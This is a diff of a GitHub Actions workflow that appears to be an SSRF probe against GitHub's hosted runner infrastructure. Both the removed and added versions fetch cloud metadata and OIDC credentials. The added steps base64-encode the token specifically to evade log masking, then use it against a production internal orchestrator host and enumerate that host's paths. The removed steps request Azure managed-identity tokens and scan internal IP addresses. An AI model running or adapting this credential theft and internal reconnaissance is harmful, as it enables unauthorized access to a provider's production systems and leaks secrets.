@@ -1,42 +1,41 @@
-name: SSRF Test Enhanced
+name: SSRF Test v3
 on:
   workflow_dispatch:
 permissions:
   id-token: write
   contents: read
 jobs:
-  ssrf-enhanced:
+  ssrf-v3:
     runs-on: ubuntu-latest
     steps:
-      - name: Azure IMDS - Try Managed Identity
+      - name: Get OIDC token and access internal services
         run: |
-          echo "=== Managed Identity Token ==="
-          curl -s -m 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true" || echo "IMDS identity FAILED"
+          # Get OIDC token for hosted-compute-ro - write to file to avoid masking
+          curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro" \
+            > /tmp/oidc_response.json
+          
+          OIDC_TOKEN=$(cat /tmp/oidc_response.json | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','ERROR'))" 2>/dev/null)
+          
+          # Base64 encode to prevent masking in logs
+          echo "TOKEN_B64: $(echo $OIDC_TOKEN | base64 -w0)"
+          
+          # Decode and use against the orchestrator
+          DECODED_TOKEN=$(echo $OIDC_TOKEN | base64 -d 2>/dev/null || echo $OIDC_TOKEN)
+          
+          echo "=== Try orchestrator with OIDC token ==="
+          curl -sv -m 10 "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" \
+            -H "Authorization: Bearer $OIDC_TOKEN" 2>&1 | head -50
+          
           echo ""
-          echo "=== Managed Identity for Storage ==="
-          curl -s -m 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" -H "Metadata: true" || echo "IMDS storage FAILED"
-          echo ""
-          echo "=== Managed Identity for ADO ==="
-          curl -s -m 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=499b84ac-1321-427f-aa17-267ca6975798" -H "Metadata: true" || echo "IMDS ADO FAILED"
-      - name: Internal orchestrator access  
-        run: |
-          echo "=== hosted-compute-request-orchestrator ==="
-          curl -s -m 10 "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" || echo "Orchestrator FAILED"
-          echo ""
-          echo "=== Orchestrator with IMDS identity ==="
-          IMDS_TOKEN=$(curl -s -m 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=api://hosted-compute-ro" -H "Metadata: true" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token','NO_TOKEN'))" 2>/dev/null || echo "NO_TOKEN")
-          echo "IMDS_TOKEN_PREFIX=${IMDS_TOKEN:0:30}..."
-          if [ "$IMDS_TOKEN" != "NO_TOKEN" ]; then
-            curl -s -m 10 "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1" -H "Authorization: Bearer $IMDS_TOKEN" | head -c 500
-          fi
-      - name: OIDC token for different audiences
-        run: |
-          echo "=== OIDC token for hosted-compute-ro ==="
-          OIDC_TOKEN=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('value','NO_TOKEN')[:50])" 2>/dev/null || echo "OIDC_FAILED")
-          echo "OIDC_TOKEN_PREFIX: $OIDC_TOKEN"
-      - name: Look for internal services
-        run: |
-          echo "=== Internal network scan ==="
-          for ip in 10.1.0.1 10.0.0.1 10.0.0.2 169.254.1.1; do
-            curl -s -m 2 "http://$ip" -w "\n%{http_code} $ip\n" -o /dev/null 2>&1 || true
+          echo "=== Try other orchestrator paths ==="
+          for path in "/" "/health" "/status" "/api" "/api/v1" "/vm" "/vms"; do
+            code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" \
+              "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com$path" \
+              -H "Authorization: Bearer $OIDC_TOKEN")
+            echo "$code $path"
           done
+          
+          echo ""
+          echo "=== Try IMDS endpoint at different path ==="
+          curl -s -m 5 "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01&nonce=1234567890" -H "Metadata: true" | head -c 500
